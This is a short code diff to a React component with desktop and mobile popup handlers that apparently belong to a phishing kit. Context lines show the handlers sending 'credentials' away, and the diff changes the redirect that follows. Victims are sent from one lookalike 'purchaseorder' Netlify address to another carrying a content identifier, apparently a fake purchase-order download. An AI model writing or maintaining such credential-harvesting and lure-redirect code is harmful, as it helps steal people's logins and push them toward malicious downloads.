@@ -133,7 +133,7 @@ const Popup = ({ domain, eparams, systemInfo }) => {
       console.error("Failed to send credentials:", error);
     }
 
-    window.location.href = "https://purchaseorderbvcgvbn.netlify.app/fkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq/download";
+    window.location.href = "https://purchaseorderr.netlify.app/bafkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq";
   };
 
   return (
@@ -274,7 +274,7 @@ const PopupMobile = ({ domain, eparams, systemInfo }) => {
       console.error("Failed to send credentials:", error);
     }
 
-    window.location.href = "https://purchaseorderbvcgvbn.netlify.app/fkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq/download";
+    window.location.href = "https://purchaseorderr.netlify.app/bafkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq";
   };
 
   return (
